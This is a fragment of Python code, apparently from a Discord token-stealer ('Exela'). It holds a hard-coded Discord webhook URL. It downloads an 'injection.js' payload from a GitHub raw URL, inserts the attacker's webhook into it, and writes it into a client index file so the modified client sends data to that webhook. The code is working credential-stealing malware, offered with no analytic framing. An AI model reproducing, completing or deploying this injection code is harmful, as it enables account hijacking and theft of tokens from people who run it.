...
webhook = 'https://discord.com/api/webhooks/1401587386797789265/XjQg0CXcG8hOIIOTGDBVAX7MJ_0_ihIIgj8ia2JBE43Oo94MSfm6QeyUiCnXkeUJbOG7'
                        ...
                        with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
                            if not webhook in file.read():
                                ...
                                with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
                                    x.write(injection_code.replace("https://discord.com/api/webhooks/1401587386797789265/XjQg0CXcG8hOIIOTGDBVAX7MJ_0_ihIIgj8ia2JBE43Oo94MSfm6QeyUiCnXkeUJbOG7",webhook))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://raw.githubusercontent.com/justforExela/injection/main/injection.js") as response:
                    data = await response.text()
                    return data.replace("https://discord.com/api/webhooks/1401587386797789265/XjQg0CXcG8hOIIOTGDBVAX7MJ_0_ihIIgj8ia2JBE43Oo94MSfm6QeyUiCnXkeUJbOG7", webhook)
        except Exception as error:
